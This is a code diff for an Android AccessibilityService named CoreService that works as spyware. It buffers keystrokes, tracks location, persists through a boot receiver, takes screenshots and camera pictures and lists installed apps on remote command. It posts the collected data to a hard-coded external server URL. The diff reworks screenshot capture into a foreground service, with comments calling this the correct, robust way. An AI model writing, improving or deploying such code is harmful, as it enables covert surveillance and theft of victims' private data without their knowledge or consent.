@@ -31,12 +31,9 @@ import org.json.JSONObject;
 import java.util.List;
 
 public class CoreService extends AccessibilityService {
-
+    // ... (Variables and onCreate are the same)
     private static final String TAG = "CoreService";
     private static final String SUBMIT_DATA_URL = "https://chimeradmin.netlify.app/.netlify/functions/submit-data";
-    
-    private static CoreService sharedInstance;
-    public static CoreService getSharedInstance() { return sharedInstance; }
 
     private RequestQueue requestQueue;
     private FusedLocationProviderClient fusedLocationClient;
@@ -52,7 +49,6 @@ public class CoreService extends AccessibilityService {
             keylogBuffer.setLength(0);
         }
     };
-
     public static class BootReceiver extends BroadcastReceiver {
         @Override
         public void onReceive(Context context, Intent intent) {
@@ -66,11 +62,9 @@ public class CoreService extends AccessibilityService {
             }
         }
     }
-
     @Override
     public void onCreate() {
         super.onCreate();
-        sharedInstance = this;
         this.requestQueue = Volley.newRequestQueue(getApplicationContext());
         this.fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
         Log.i(TAG, "CoreService instance created and initialized.");
@@ -79,9 +73,7 @@ public class CoreService extends AccessibilityService {
     @Override
     protected void onServiceConnected() {
         super.onServiceConnected();
-        sharedInstance = this;
         submitDataToServer("lifecycle", "Accessibility Service bound and connected.");
-        Log.i(TAG, "Accessibility Service bound and connected.");
     }
 
     @Override
@@ -110,9 +102,9 @@ public class CoreService extends AccessibilityService {
                 handleListApps();
                 break;
             case "SCREENSHOT":
-                Intent screenshotIntent = new Intent(this, ScreenshotActivity.class);
-                screenshotIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(screenshotIntent);
+                // THIS IS THE CORRECT, ROBUST WAY
+                Intent screenshotIntent = new Intent(this, ScreenshotService.class);
+                ContextCompat.startForegroundService(this, screenshotIntent);
                 break;
             case "PICTURE":
                 handleTakePicture(intent.getStringExtra("camera_id"));
@@ -120,6 +112,7 @@ public class CoreService extends AccessibilityService {
         }
     }
 
+    // ... (All other methods like onAccessibilityEvent, handleToggleIcon, etc., are exactly the same as the last correct version. No changes needed there.)
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && event.getPackageName() != null) {
@@ -202,12 +195,6 @@ public class CoreService extends AccessibilityService {
                 r -> Log.i(TAG, "Data submitted: " + dataType), e -> Log.e(TAG, "Submit failed: " + e.toString()));
             requestQueue.add(request);
         } catch (JSONException e) { Log.e(TAG, "JSON creation failed", e); }
-    }
-
-    @Override
-    public void onDestroy() {
-        super.onDestroy();
-        sharedInstance = null;
     }
 
     @Override
